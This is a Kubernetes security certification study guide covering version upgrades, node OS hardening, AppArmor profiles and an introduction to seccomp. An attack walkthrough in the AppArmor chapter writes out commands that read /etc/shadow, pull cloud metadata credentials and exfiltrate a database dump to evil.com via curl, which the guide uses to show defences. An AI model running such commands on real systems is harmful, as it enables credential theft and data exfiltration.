📝 Chapter 12 — CKS Practice Questions

Q1
What is the Kubernetes version support policy? How many versions are simultaneously supported, and what happens when a version reaches EOL?
Show Answer
Answer

Kubernetes supports 3 versions at a time: the current release (N) and the two previous minor versions (N-1, N-2). Example: if latest is 1.30, supported versions are 1.30, 1.29, and 1.28. When a version reaches EOL, it receives NO security patches — any CVEs discovered after EOL remain unpatched forever.

Explanation

Running an EOL Kubernetes version is a critical security risk. The CKS exam expects you to identify outdated clusters and recommend upgrades. Check your version: kubectl version. If you're more than 3 minor versions behind, you're vulnerable to KNOWN, PATCHED vulnerabilities.

Q2
What was CVE-2018-1002105 (CVSS 9.8)? Explain the vulnerability and which CKS domain addresses this type of threat.
Show Answer
Answer

CVE-2018-1002105 was a critical privilege escalation in the Kubernetes API server. An unauthenticated attacker could send a specially crafted request through the API server's proxy functionality to backend servers, potentially gaining cluster-admin access. Fixed in Kubernetes 1.10.11, 1.11.5, 1.12.3.

Explanation

This CVE illustrates why version management (CKS Domain 2) is critical. A 9.8 CVSS score means "game over" for the cluster. If you're running <1.10.11, you're vulnerable. The fix was updating to a patched version. The CKS exam may reference CVEs to justify version upgrade urgency.

Q3
What is the 3-phase safe Kubernetes upgrade strategy? Describe each phase with specific commands.
Show Answer
Answer
PhaseActions
1. PrepareBackup etcd, drain control plane node, verify compatibility
2. Control PlaneUpgrade kubeadm → kubelet → kubectl on control plane node
3. WorkersDrain each worker → upgrade kubeadm + kubelet → uncordon
# Phase 1: Prepare
kubectl drain <node> --ignore-daemonsets
etcdctl snapshot save /backup/etcd-snapshot.db

# Phase 2: Control Plane
apt-mark unhold kubeadm && apt update && apt install -y kubeadm=<version>
kubeadm upgrade plan
kubeadm upgrade apply v<version>

# Phase 3: Workers
kubectl drain <worker> --ignore-daemonsets
apt install -y kubeadm=<version> && kubeadm upgrade node
apt install -y kubelet=<version> && systemctl restart kubelet
kubectl uncordon <worker>
Explanation

The CKS exam may ask you to perform an upgrade safely. Key rules: (1) always backup etcd first, (2) upgrade ONE minor version at a time (no skipping), (3) drain nodes before upgrading, (4) verify cluster health after each node: kubectl get nodes should show Ready.

Q4
When should you apply a patch release (1.30.1 → 1.30.2) vs a minor upgrade (1.29 → 1.30)? What's the risk difference?
Show Answer
Answer
TypeWhenRisk
Patch (1.30.1→1.30.2)Security fix, CVE patch. Apply IMMEDIATELYLOW — no API changes, backward-compatible
Minor (1.29→1.30)Feature updates, deprecation. Plan + test firstMEDIUM — API deprecations, behavior changes
Explanation

CKS exam tip: security patches (patch releases) should be applied within 24-48 hours. Minor upgrades need testing in staging first — deprecated APIs can break your workloads. Always check the changelog for removed APIs before a minor upgrade: kubectl api-versions.

Q5
How do you check what version of Kubernetes your cluster is running? Write commands to check both server and client versions.
Show Answer
Answer
# Short version
kubectl version

# Full version details
kubectl version --output=yaml

# Just server version
kubectl version --short  # deprecated
kubectl get nodes -o wide  # shows kubelet version per node

# Check API server version
kubectl get --raw /version | jq .
Explanation

Always check version before any upgrade task. kubectl version --output=json gives structured output you can parse. On the CKS exam, the cluster version tells you which API versions are available and which features can be used (e.g., PSS requires 1.23+, bound tokens 1.24+).

Q6
During a minor upgrade from 1.28 to 1.29, some deployments fail with "no matches for kind Deployment in version extensions/v1beta1". What happened and how do you fix it?
Show Answer
Answer

The extensions/v1beta1 API was deprecated and removed. Deployments moved to apps/v1. Fix: update all manifests to use apiVersion: apps/v1 and re-apply. Check deprecated APIs before upgrading:

# Check for deprecated API usage
kubectl get apiservices
kube-apiserver --help | grep deprecated

# Find resources using old APIs
kubectl get deployments,daemonsets -A -o json | jq '.items[] | select(.apiVersion | startswith("extensions"))'
Explanation

API deprecation is the #1 cause of upgrade failures. The CKS exam tests awareness: before upgrading, check the Kubernetes changelog for removed APIs. Use kubectl convert or manually update apiVersion fields. Always test in staging before production upgrade.

Q7
How do you backup and restore etcd as part of a version upgrade? Write all commands.
Show Answer
Answer
# BACKUP
ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  snapshot save /backup/etcd-$(date +%Y%m%d).db

# Verify backup
ETCDCTL_API=3 etcdctl snapshot status /backup/etcd-*.db

# RESTORE (if needed)
etcdctl snapshot restore /backup/etcd-*.db --data-dir=/var/lib/etcd-restore
# Then update etcd manifest to use new data-dir
Explanation

etcd backup is mandatory before ANY upgrade. If the upgrade fails, you can restore from snapshot. The certificate paths are critical — they're always at /etc/kubernetes/pki/etcd/. On the CKS exam: always backup etcd before making control plane changes.

Q8
For the anihpj cluster running K8s 1.27, create an upgrade plan to 1.29. Include: pre-upgrade checks, upgrade order, post-upgrade verification.
Show Answer
Answer
  1. Pre-upgrade: Backup etcd, check deprecated APIs in 1.28 and 1.29, drain control plane
  2. Upgrade to 1.28: kubeadm → kubelet → kubectl on control plane, then workers
  3. Verify 1.28: All nodes Ready, anihpj pods Running, NetworkPolicy functional
  4. Upgrade to 1.29: Same process — control plane first, then workers
  5. Post-upgrade: Run kube-bench, verify anihpj deployment, test TLS, check audit logs
Explanation

Never skip versions: 1.27→1.29 requires two upgrades (1.27→1.28, then 1.28→1.29). The CKS exam tests this: you must upgrade one minor version at a time. Each step requires verification before proceeding. Rushing = cluster instability.

Q9
What command shows you which API versions and resources are available in your cluster? How do you check if a specific API is deprecated?
Show Answer
Answer
# List all API groups and versions
kubectl api-versions

# List all available resources with their API groups
kubectl api-resources

# Check if a specific version is available
kubectl api-resources --api-group=networking.k8s.io

# Check deprecation warnings (1.25+)
kubectl get deployments -o yaml
# Look for: "Warning: networking.k8s.io/v1beta1 Ingress is deprecated"
Explanation

kubectl api-resources is your pre-upgrade best friend. It shows all available resources, their API groups, and whether they're namespaced. Always run this before and after an upgrade to verify nothing was lost. Deprecation warnings appear in kubectl output for 1.25+.

Q10
What security improvements came with Kubernetes 1.24, 1.25, and 1.27 that are relevant to CKS? Create a timeline of key security features.
Show Answer
Answer
VersionSecurity FeatureCKS Relevance
1.24Bound SA tokens GA, dockershim removedToken security, container runtime security
1.25PodSecurityPolicy removed, PSS GAPod Security Standards (Domain 4)
1.27SeccompDefault feature GA, read-only port removedSeccomp profiles, kubelet hardening
Explanation

Knowing what features came when helps with the CKS exam. If the cluster is pre-1.25, you can't use PSS labels — you'd need PSP (deprecated). If it's 1.27+, you can use --seccomp-default for kubelet. Check kubectl version first, then apply the appropriate security controls.

🟡 Part 4: System HardeningChapters 13-16

Chapter 13: Reducing the OS Attack Surface — Node Hardening

If a container escapes its sandbox, it lands on the node operating system. A hardened node OS is your last line of defense — it makes it much harder for attackers to persist, pivot, or escalate. This chapter covers removing unused services, closing ports, hardening SSH, and minimizing the OS attack surface on every Kubernetes node.

🟡 Intermediate⏱️ ~1.5 hours🔧 Hands-On🎯 OS Hardening

🎯 What You'll Learn

  • ✅ Why the node OS is your last line of defense after container escape
  • ✅ How to audit and remove unnecessary services and packages
  • ✅ How to identify and close unnecessary open ports with firewall rules
  • ✅ How to harden SSH access and create dedicated admin users
  • ✅ Linux user account hardening — no shared root, key-based auth only
🎓 CKS Relevance
System Hardening 15%
CKS Exam: Know Your Node OS Commands

On the CKS exam, you'll need to audit and harden Linux nodes. Key commands to know cold: systemctl list-units --type=service (list services), ss -tlnp (list open ports), apt remove / yum remove (remove packages), ufw enable / firewalld (firewall rules), sshd_config edits (SSH hardening). CIS Benchmarks for Linux nodes are your guide — every CIS check maps to a specific hardening action.

13.1 The Node OS Is Your Last Line of Defense

If a container escapes its sandbox (via kernel exploit, misconfigured privileged mode, or CVE), the attacker lands on the node operating system. From there, they can access other containers, read node-level secrets, and potentially pivot to cloud resources. A hardened node OS limits this blast radius dramatically.

Container Escape → Hardened OS → Limited Blast Radius
1
🐳 Container Escape

Attacker exploits kernel vuln or misconfigured privileged mode to escape container isolation.

2
🖥️ Lands on Node OS

Attacker now has a shell on the underlying Linux host — but what can they actually do?

3
🛡️ OS Hardening Kicks In

No sudo access (dedicated user, no shared root). SSH key-only auth. Unnecessary services removed.

4
🔒 Limited Blast Radius

No packages to exploit, no open ports to pivot through, no IAM credentials to steal. Attacker is stuck.

📖 The OS Hardening Mindset

Think of the node OS like the foundation of a building. You've secured the doors (API server), windows (NetworkPolicy), and rooms (SecurityContext). But if the foundation is cracked — if anyone can SSH in as root, if unnecessary services expose ports, if cloud IAM keys are on disk — the entire building can collapse. OS hardening is the unglamorous but essential work that makes all other Kubernetes security controls effective.

🏠 The House Analogy — Defense in Depth at the OS Level

A Hardened Node Is Like a Well-Secured House
   🏠 YOUR KUBERNETES NODE (the house)
   ─────────────────────────────────────────────────
   
   🔒 FRONT DOOR (SSH)
   → Key-only entry (no passwords)
   → Each family member has their OWN key
   → Root "master key" is locked in a safe
   → Visitors sign a logbook (audit trail)
   
   🪟 WINDOWS (Open Ports)
   → Only needed windows are unlocked
   → All others: boarded up (firewall DENY)
   → Even open windows have bars (TLS/auth)
   
   📦 STORAGE (Packages)
   → No dangerous items stored (remove FTP, CUPS)
   → Only essentials: kubelet, containerd, sshd
   → If it's not needed for K8s, it goes in the trash
   
   🔑 SAFE (IAM Credentials)
   → Cloud keys stored in a wall safe, not on the counter
   → Each person has exactly the access they need
   → No "master admin" key to the cloud account
   
   💡 A burglar who breaks one window should NOT
      get access to the safe, the front door keys,
      AND the neighbor's house. OS hardening ensures
      each breach has a LIMITED blast radius.

CIS Benchmarks Cover the OS Level Too

The CIS Benchmarks don't stop at Kubernetes components. The CIS Distribution Independent Linux Benchmark covers node-level hardening with checks for:

📦
Unused Packages

Every installed package is a potential attack surface. Web servers, FTP, printing services — remove everything not needed for K8s operation.

🔌
Open Ports

Only Kubernetes-required ports should be listening. Close everything else with firewall rules. Audit with ss -tlnp.

🔑
IAM + Users

Dedicated Linux users per admin. No shared root. SSH key-only. Cloud IAM roles with minimal permissions.

13.2 Removing Unused Services and Packages

Every service and package installed on a node represents a potential attack surface. A web server you forgot about, a printing service that ships with the OS — each one has CVEs that attackers can exploit.

Audit and Remove — The Process

Terminal: Audit and remove unnecessary services
# Step 1: List ALL running services
systemctl list-units --type=service --state=running

# Step 2: Identify non-Kubernetes services (apache, vsftpd, cups, etc.)
# Step 3: Stop and disable each unnecessary service
sudo systemctl stop apache2
sudo systemctl disable apache2

# Step 4: Remove the packages completely
sudo apt remove --purge apache2 vsftpd cups avahi-daemon
# RHEL/CentOS: sudo yum remove httpd vsftpd cups avahi-daemon

# Step 5: Verify — re-run the audit
systemctl list-units --type=service --state=running
# → Only kubelet, containerd, sshd, and essential services should remain

Common Unnecessary Services on K8s Nodes

ServiceWhy It Might Be InstalledAction on K8s Node
apache2 / nginxWeb server — not needed on nodeRemove
vsftpdFTP server — major attack surfaceRemove
avahi-daemonmDNS discovery — not neededRemove
cupsPrinting service — no printers in K8s!Remove
snapdPackage manager — extra attack surfaceEvaluate
docker (old)K8s 1.24+ uses containerd nativelyRemove if not needed
⚠️ Don't Remove These Essential Services

Keep: kubelet, containerd (or CRI-O), sshd (for admin access), systemd-journald, systemd-timesyncd (time sync). Removing these breaks your cluster. When in doubt, check: "Is this service required for Kubernetes to operate?" If the answer is no, remove it.

13.3 Limiting Open Ports and Network Interfaces

Every open port is a door an attacker can knock on. Only Kubernetes-required ports should be listening — everything else must be closed with firewall rules.

Audit Open Ports

Terminal: Audit and secure ports
# Check all listening ports
ss -tlnp
# → Review every port. If it's not on the K8s required list, close it.

# Block unnecessary ports with UFW (Ubuntu/Debian)
sudo ufw default deny incoming
sudo ufw allow 22/tcp        # SSH (admin access)
sudo ufw allow 6443/tcp      # kube-apiserver
sudo ufw allow 10250/tcp     # kubelet API (from control plane only!)
sudo ufw enable

# Block with firewalld (RHEL/CentOS)
sudo firewall-cmd --permanent --add-port=6443/tcp
sudo firewall-cmd --reload

Required Kubernetes Ports — What Should Be Open

ComponentPort(s)Who Needs AccessAllow From
kube-apiserver6443All cluster componentsAdmin IPs only
etcd2379-2380API server, etcd peersControl plane only
kubelet10250API server, monitoringControl plane only
kube-proxy10256Health checksInternal only
NodePort services30000-32767External users (optional)Restricted
CNI (Calico BGP)179Other nodesCluster nodes only
🔴 Ports That Must NEVER Be Open to the Internet

Port 10250 (kubelet API) and 2379 (etcd) should NEVER be reachable from outside the cluster network. An attacker who can reach these ports can: read all pod specs via kubelet, execute commands in containers, or directly read/write etcd data including all Secrets. Use cloud security groups or firewall rules to restrict these ports to internal cluster IPs only.

13.4 User and IAM Hardening on Nodes

Kubernetes ServiceAccounts ≠ Linux user accounts. ServiceAccounts control pod-to-API access. Linux users control who can SSH into nodes and run commands directly. Both must be hardened.

SSH Hardening — Before vs After

🔴 INSECURE SSH Configuration
/etc/ssh/sshd_config — BROKEN
PermitRootLogin yes          # 🔴 Root can SSH in!
PasswordAuthentication yes   # 🔴 Brute-force target!
# Shared root account       # 🔴 No accountability!
# No key rotation           # 🔴 Stale keys = backdoors
✅ HARDENED SSH Configuration
/etc/ssh/sshd_config — SECURE
PermitRootLogin no           # ✅ Root cannot SSH
PasswordAuthentication no    # ✅ Key-based auth only
PubkeyAuthentication yes     # ✅ SSH keys required
MaxAuthTries 3               # ✅ Limit brute-force attempts
ClientAliveInterval 300      # ✅ Timeout idle sessions

Create Dedicated Admin Users (No Shared Root!)

Terminal: Create hardened admin user
# Create a dedicated admin user (NOT "admin" or "root"!)
sudo useradd -m -s /bin/bash node-admin-alice
sudo usermod -aG sudo node-admin-alice

# Set up SSH key (NEVER share private keys!)
sudo mkdir -p /home/node-admin-alice/.ssh
sudo cp ~/.ssh/authorized_keys /home/node-admin-alice/.ssh/
sudo chown -R node-admin-alice:node-admin-alice /home/node-admin-alice/.ssh
sudo chmod 700 /home/node-admin-alice/.ssh
sudo chmod 600 /home/node-admin-alice/.ssh/authorized_keys

# Verify: root login disabled + key auth only
sudo sshd -t  # Test config syntax
sudo systemctl restart sshd
📋 Node Access Hardening Checklist
  • □ SSH access: use SSO or dedicated user accounts — audit keys, remove stale users
  • □ Disable root SSH login: PermitRootLogin no in /etc/ssh/sshd_config
  • □ Use SSH key-based auth only — disable password login: PasswordAuthentication no
  • □ Rotate SSH keys regularly; immediately remove keys for departed team members
  • □ Use node groups and IAM roles for cloud-managed nodes (never admin-level credentials)
  • □ Never expose kubelet API (port 10250) to the internet — firewall restrict to control plane IPs

📝 Chapter 13 — CKS Practice Questions

Q1
How do you list all running services on a Kubernetes node and identify which ones are unnecessary? Write the commands.
Show Answer
Answer
systemctl list-units --type=service --state=running
# Identify non-essential: FTP, telnet, cups, bluetooth, avahi-daemon
# Remove:
systemctl stop <service> && systemctl disable <service>
apt remove --purge <package>  # or yum remove
Explanation

Every unnecessary service is a potential attack vector. CKS Domain 3 tests your ability to minimize the OS attack surface. After removing services, verify: systemctl list-units --type=service --state=running | wc -l should show fewer services.

Q2
What command shows all open ports on a node? What ports should a Kubernetes node have open?
Show Answer
Answer
ss -tlnp  # All listening TCP ports
ss -ulnp  # All listening UDP ports

Expected ports: 6443 (API), 10250 (kubelet), 10255 (kubelet read-only, should be 0), 2379 (etcd), 22 (SSH). Close all others with firewall rules.

Explanation

After auditing, close unnecessary ports with ufw deny <port> (Ubuntu) or firewall-cmd --remove-port=<port>/tcp (RHEL). The CKS exam may ask you to "harden a node" — reducing open ports is always part of the answer.

Q3
How do you harden SSH access to Kubernetes nodes? Write the specific sshd_config changes.
Show Answer
Answer
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AllowUsers admin
MaxAuthTries 3
ClientAliveInterval 300
Explanation

After editing, restart: systemctl restart sshd. Key-based auth only, no root login, limited users, auto-timeout. This is part of CIS Benchmark Section 4 node hardening.

Q4
How do you remove unnecessary packages from a Kubernetes node? What packages are typically safe to remove?
Show Answer
Answer
apt list --installed | grep -E 'ftp|telnet|nfs|samba|cups|bluetooth'
apt remove --purge telnetd nfs-kernel-server samba cups bluetooth
apt autoremove

Safe to remove: FTP servers, telnet, NFS server, Samba, CUPS (printing), Bluetooth, audio services. NEVER remove: kubelet, kubeadm, kubectl, container runtime (containerd/docker).

Explanation

Package minimization reduces CVEs that could be exploited. Each removed package = fewer potential vulnerabilities. The CKS exam may ask you to "remove unnecessary packages" — know which ones are safe to remove.

Q5
What kernel parameters should be hardened on a Kubernetes node? List 3 critical sysctl settings.
Show Answer
Answer
# /etc/sysctl.d/99-kubernetes.conf
net.ipv4.ip_forward=1           # Required for pod networking
net.bridge.bridge-nf-call-iptables=1  # Required for NetworkPolicy
kernel.panic=10                 # Auto-reboot on kernel panic

# Apply
sysctl --system
Explanation

The first two are required for Kubernetes to function. The third is a security hardening measure — if the kernel panics, the node should reboot automatically rather than staying hung. Never disable ip_forward or bridge-nf-call-iptables on a K8s node.

Chapter 14: AppArmor — Application-Level Sandboxing

AppArmor is a Linux security module that restricts what files, networks, and capabilities a program can access. Think of it as a security clearance badge — even if an attacker compromises your Django container, they can only enter the rooms (files, sockets, capabilities) their AppArmor badge allows. This is defense in depth at the OS level.

🟡 Intermediate⏱️ ~1.5 hours🔧 Hands-On🎯 AppArmor

🎯 What You'll Learn

  • ✅ What AppArmor is and why it's essential for container security
  • ✅ The three AppArmor modes: disabled, complain (learning), enforce (blocking)
  • ✅ How to generate, test, and enforce AppArmor profiles for anihpj
  • ✅ How to apply AppArmor profiles in Kubernetes pod specs (annotation + securityContext)
  • ✅ AppArmor vs Seccomp — know the difference for the CKS exam
🎓 CKS Relevance
System Hardening 15%

14.1 What Is AppArmor and Why Does It Matter for Containers?

AppArmor creates per-process security profiles — rules that say exactly what a program can read, write, and connect to. Without AppArmor, a compromised container can read /etc/shadow, write to /proc, open raw network sockets — essentially do anything on the node. With AppArmor, even a fully compromised container can only do what its profile explicitly allows.

📦 Container WITHOUT vs WITH AppArmor — The Django Example
🔴 WITHOUT AppArmor — Django Process
  • 🔴 Read /etc/shadow (password file)
  • 🔴 Write to /proc (kernel interfaces)
  • 🔴 Open raw network sockets
  • 🔴 Access /dev devices
  • 🔴 Read any file on the node filesystem
✅ WITH AppArmor Profile — Django Process
  • ✅ Read /app/ directory (its own code) only
  • ✅ Write to /tmp/ and /app/media/ only
  • ✅ Connect TCP to postgres:5432
  • ✅ Connect TCP to redis:6379
  • 🚫 Everything else → BLOCKED + LOGGED
📖 The Security Clearance Analogy

Think of AppArmor like a security clearance badge in a government building. Your badge says exactly which rooms you can enter and which documents you can read. Even if someone steals your badge, they can only go where the badge allows. Without a badge (no AppArmor), anyone who gets past the front door can roam freely. AppArmor gives every container process a specific, limited badge.

⚔️ AppArmor in Action — Stopping a Real Attack on anihpj

Let's walk through what happens when an attacker exploits a CVE in the Pillow image library (a common Django dependency) — first without AppArmor, then with it:

Attack Scenario: CVE in Pillow Library — Code Execution Inside Container
🔴 WITHOUT AppArmor — Attack Succeeds
1. Attacker uploads crafted PNG → triggers Pillow CVE → gets shell as user 'root' 2. cat /etc/shadow → dumps password hashes ✅ 3. curl http://169.254.169.254/latest/meta-data/ → reads AWS credentials ✅ 4. cat /proc/1/environ → finds DATABASE_URL ✅ 5. curl https://evil.com/exfil -d @db_dump → data exfiltrated ✅ 💀 BREACH SUCCESSFUL
✅ WITH AppArmor — Attack Blocked
1. Attacker uploads crafted PNG → triggers Pillow CVE → gets shell as user 'root' 2. cat /etc/shadow → Permission denied (AppArmor) ❌ 3. curl http://169.254.169.254/... → Permission denied (AppArmor) ❌ 4. cat /proc/1/environ → Permission denied (AppArmor) ❌ 5. journalctl -k | grep apparmor → "DENIED" logs for ALL attempts → Security team alerted 🚨 🛡️ BREACH CONTAINED — ZERO DATA LOST

14.2 AppArmor Modes — Disabled, Complain, Enforce

AppArmor has three modes that control how it handles violations. Always start in complain mode to learn what your application actually needs, then switch to enforce for production.

ModeBehaviorWhen to Use
disabledNo AppArmor for this process. No restrictions at all.Never in production — only for initial troubleshooting
complainLogs violations to syslog/journald. Does NOT block them.Profile development / testing / learning what the app needs
enforceBlocks ALL actions not explicitly allowed in the profile. Logs denials.Production — always use enforce mode!

Disabled Mode — No Restrictions

In disabled mode, AppArmor does not apply to this process at all. The process has unrestricted access to files, networks, and capabilities — just like a normal Linux process. Never use disabled mode in production — it's only for initial troubleshooting when you need to rule out AppArmor as the cause of an issue.

Complain Mode — Log Violations, Don't Block

In complain mode, AppArmor logs every policy violation to syslog/journald but does NOT block the action. This is your learning mode — run your app, check journalctl -k | grep apparmor, and add any legitimately needed accesses to your profile. Once you've tuned the profile through complain mode, switch to enforce.

Enforce Mode — Block All Unauthorized Actions

In enforce mode, AppArmor blocks every action not explicitly allowed by the profile AND logs the denial. This is the production mode. A blocked action returns a permission error to the process — the application sees "Permission denied" just like it would from standard Linux file permissions.

AppArmor Profile Workflow — From Scratch to Production

1
GENERATE

aa-genprof /usr/bin/python3
Runs app, records accesses
Writes draft profile

2
TEST (Complain)

aa-complain profile-name
Run app normally
Check syslog for denials

3
ENFORCE

aa-enforce profile-name
Profile active → violations blocked
+ logged for review

4
VERIFY

ssh each node → aa-status
Must show profile (enforce)
on ALL K8s nodes

5
APPLY to K8s

Add to pod securityContext
or annotation (pre-1.30)
Deploy + verify

Terminal: AppArmor commands
# Check AppArmor status
sudo aa-status
# → Shows loaded profiles, modes, and process counts

# Switch a profile to complain mode (logs, doesn't block)
sudo aa-complain /etc/apparmor.d/anihpj-django

# Check logs for AppArmor events
sudo journalctl -k | grep apparmor
# ALLOWED = action was permitted in complain mode (add to profile)
# DENIED  = action would be blocked in enforce mode (keep denied)

# Switch to enforce mode (blocks violations)
sudo aa-enforce /etc/apparmor.d/anihpj-django

# Verify on ALL nodes
ssh node01 sudo aa-status | grep anihpj-django
# → Should show: anihpj-django (enforce)

14.3 Writing AppArmor Profiles for anihpj

An AppArmor profile defines exactly what a program can access. Here's a profile for the anihpj Django container — notice how it allows only the app directory, media uploads, and specific network connections.

anihpj Django AppArmor Profile

/etc/apparmor.d/anihpj-django
#include <tunables/global>

profile anihpj-django flags=(attach_disconnected) {
  # Include base abstractions (file access, console, etc.)
  #include <abstractions/base>
  #include <abstractions/python>

  # Allow app code files — read ONLY
  /app/** r,

  # Allow media + static file writes
  /app/media/** rw,
  /app/staticfiles/** rw,
  /tmp/** rw,

  # Allow network connections (TCP only, no raw sockets)
  network inet tcp,
  network inet6 tcp,

  # Explicitly DENY dangerous paths
  deny /etc/shadow r,
  deny /etc/passwd w,
  deny /proc/** rw,
  deny /sys/** rw,
  deny /dev/** rw,

  # Allow /proc for basic process info (read-only, limited)
  /proc/sys/kernel/random/** r,
  /proc/self/** r,
}
💡 Key Profile Design Principles
  • Start restrictive, add as needed: Begin with minimal permissions in complain mode, then add access as the app requests it (check syslog).
  • Use abstractions: #include <abstractions/base> and <abstractions/python> cover common operations without manual rules.
  • Explicit denies are safer: Even though everything is denied by default, explicit deny rules prevent accidents if the profile is modified later.
  • Test on ALL node types: If your cluster has mixed OS versions or architectures, test the profile on each node type.

14.4 Applying AppArmor in Kubernetes

The profile must be loaded on every node where the pod could run. Then it's applied via pod annotation (pre-1.30) or securityContext (1.30+). The CKS exam may test both methods.

Method 1: Annotation (pre-1.30)

Annotation Method
Pod with AppArmor annotation
metadata:
  annotations:
    container.apparmor.security.\
      beta.kubernetes.io/anihpj: \
      localhost/anihpj-django
# Format: container.<name>: \
#   runtime-default | \
#   localhost/<profile>
Method 2: securityContext (1.30+)
Pod with securityContext
spec:
  containers:
  - name: anihpj
    securityContext:
      appArmorProfile:
        type: Localhost
        localhostProfile: \
          anihpj-django
# Types: Localhost, \
#   RuntimeDefault, Unconfined
⚠️ CKS Exam Tip — Profile MUST Be on the Node

The most common AppArmor mistake: referencing a profile in the pod spec that doesn't exist on the node. The pod will fail to start with a cryptic error. Always verify: ssh <node> sudo aa-status | grep <profile-name>. On the exam, if a pod won't start and you've set AppArmor, check that the profile file exists at /etc/apparmor.d/<profile-name> on the target node.

Terminal: Verify AppArmor in a running pod
# Check that the annotation is set
kubectl get pod anihpj-xxx -o jsonpath='{.metadata.annotations}' | jq .

# Verify AppArmor is active inside the container
kubectl exec anihpj-xxx -- cat /proc/self/attr/current
# → Should show: anihpj-django (enforce)

# If it shows "unconfined" → AppArmor is NOT applied!

📝 Chapter 14 — CKS Practice Questions

Q1
What are the three AppArmor modes? Explain when you would use each.
Show Answer
Answer
ModeBehaviorWhen to Use
DisabledNo AppArmor loadedN/A — must be enabled for security
ComplainLogs violations but allowsProfile development — learn what the app does
EnforceBlocks violations + logsProduction — active protection
Explanation

Always start in Complain mode to generate a profile, review logs, then switch to Enforce. Running in Enforce without testing first can break your application. CKS exam tip: aa-status shows current mode for all profiles.

Q2
Create an AppArmor profile that restricts a container to read-only access in /etc and applies it to a pod via annotation.
Show Answer
Answer
# Profile: /etc/apparmor.d/restricted-container
#include <tunables/global>
profile restricted-container flags=(attach_disconnected) {
  #include <abstractions/base>
  deny /etc/** w,
  /** rwkl,
}

# Load
apparmor_parser -r /etc/apparmor.d/restricted-container
# Pod annotation
metadata:
  annotations:
    container.apparmor.security.beta.kubernetes.io/app: localhost/restricted-container
Explanation

The annotation format is critical: container.apparmor.security.beta.kubernetes.io/<container-name>. The localhost/ prefix means the profile exists on the node. CKS exam: you'll likely be given a pre-created profile and need to apply it via annotation.

Q3
How do you verify that AppArmor is enforced on a running container? Write the commands.
Show Answer
Answer
# On the node, check container process
kubectl get pod <pod> -o json | jq -r '.status.containerStatuses[].containerID'
aa-status | grep <container-id>

# From within container (if proc mounted)
cat /proc/self/attr/current
# Output: restricted-container (enforce) = AppArmor active
# Output: unconfined = AppArmor NOT active
Explanation

If /proc/self/attr/current shows "unconfined", AppArmor is NOT applied — check the pod annotation and verify the profile exists on the node. This is a common CKS exam debugging scenario.

Q4
AppArmor vs Seccomp: What's the key difference? Which operates at the file/capability level vs the syscall level?
Show Answer
Answer
FeatureAppArmorSeccomp
LevelFile paths, capabilities, networkSystem calls (kernel interface)
GranularityPath-based rules (/etc/** w)Syscall numbers (open, write, clone)
ConfigurationProfile files in /etc/apparmor.d/JSON profiles
K8s ApplicationPod annotationsecurityContext.seccompProfile
Explanation

AppArmor = "this process can't write to /etc". Seccomp = "this process can't use the mount() syscall". They complement each other — use both for defense in depth. The CKS exam explicitly tests this distinction.

Q5
Write an AppArmor profile for the anihpj Django container that allows: read/write to /app, read-only to /etc, deny everything else.
Show Answer
Answer
# /etc/apparmor.d/anihpj-django
#include <tunables/global>
profile anihpj-django flags=(attach_disconnected) {
  #include <abstractions/base>
  #include <abstractions/python>

  /app/** rw,
  /etc/** r,
  /tmp/** rw,
  deny /etc/shadow r,
}
Explanation

This profile is Django-specific: the app needs write access to /app (for uploads, static files) and /tmp. It can read /etc (for resolv.conf, timezone) but NOT /etc/shadow. Everything else is denied by default (AppArmor whitelist model).

Chapter 15: Seccomp — Filtering System Calls

Seccomp (Secure Computing Mode) filters which Linux system calls a container process can make. Your Django app needs ~50 syscalls to function — but Linux has 300+. Seccomp blocks the other 250+, slashing the kernel attack surface by 80%. This is your most powerful container-level defense.

🟡 Intermediate⏱️ ~1.5 hours🔧 Hands-On🎯 Seccomp

🎯 What You'll Learn

  • ✅ What syscalls are and why filtering them is the most effective container defense
  • ✅ RuntimeDefault vs Custom vs Unconfined seccomp profiles
  • ✅ Which dangerous syscalls attackers abuse (ptrace, mount, kexec, setns)
  • ✅ How to apply seccomp profiles in Kubernetes pod specs
  • ✅ AppArmor vs Seccomp — know the difference (critical CKS exam topic)
🎓 CKS Relevance
System Hardening 15%

15.1 What Is Seccomp and Why Does It Protect Containers?

Every program communicates with the Linux kernel through system calls (syscalls). When your Django app reads a file, it calls read(). When it opens a network connection, it calls socket(). A typical web app uses ~40-60 different syscalls. But Linux exposes 300+ syscalls — and many of them are powerful, dangerous, and completely unnecessary for a web application.

🐧 How Seccomp Cuts the Kernel Attack Surface by 80%

Linux Kernel Has 300+ Syscalls — Django Only Needs ~50

❌WITHOUT Seccomp
🔴All 300+ syscalls availableptrace, mount, kexec, setns, create_module...
🔴Attacker can use ANY syscallContainer escape, kernel takeover possible
✅WITH Seccomp (RuntimeDefault)
✅Only ~60 allowed syscallsread, write, open, close, socket, connect...
🚫240+ syscalls BLOCKEDAll dangerous calls rejected at kernel level

Dangerous Syscalls — What Attackers Exploit, What Seccomp Blocks

Dangerous SyscallWhat It EnablesBlocked By
ptraceAttach to another process, read/write its memory — steal credentials from other containersRuntimeDefault
mountMount filesystems — escape container isolation, access host filesystemRuntimeDefault
kexec_loadReplace the running kernel entirely — complete node takeoverRuntimeDefault
create_moduleLoad a kernel module — inject malicious code into the kernelRuntimeDefault
setnsJoin another namespace — escape container namespace isolationRuntimeDefault
unshareCreate new namespaces — bypass namespace restrictionsRuntimeDefault
socket (raw)Create raw network sockets — craft malicious packets, bypass firewallCustom profile
📖 The Kernel Is Shared — That's Why Seccomp Matters

All containers on a node share the same Linux kernel. If one container can call ptrace() or mount(), it can potentially affect other containers or the host. Seccomp creates a per-container syscall filter that the kernel enforces — even if the container runs as root, the kernel will reject blocked syscalls before they execute. This is fundamentally different from filesystem or network restrictions — Seccomp operates at the kernel boundary where no container escape is possible.

🌉 The Bridge Analogy — Why Syscall Filtering Is Your Strongest Defense

Every Container Process Must Cross the Kernel Bridge
   📦 CONTAINER (User Space)           🐧 LINUX KERNEL (Protected Space)
   ────────────────────────            ───────────────────────────────────
   
   Django process                      Kernel functions:
   wants to read a file ──────────→    read()
                                       open()
   wants to send network data ────→    socket()
                                       connect()
   
   Attacker wants to:                  
   escape container ─────────────→    mount()     ← BLOCKED by Seccomp ✋
   steal credentials ────────────→    ptrace()    ← BLOCKED by Seccomp ✋
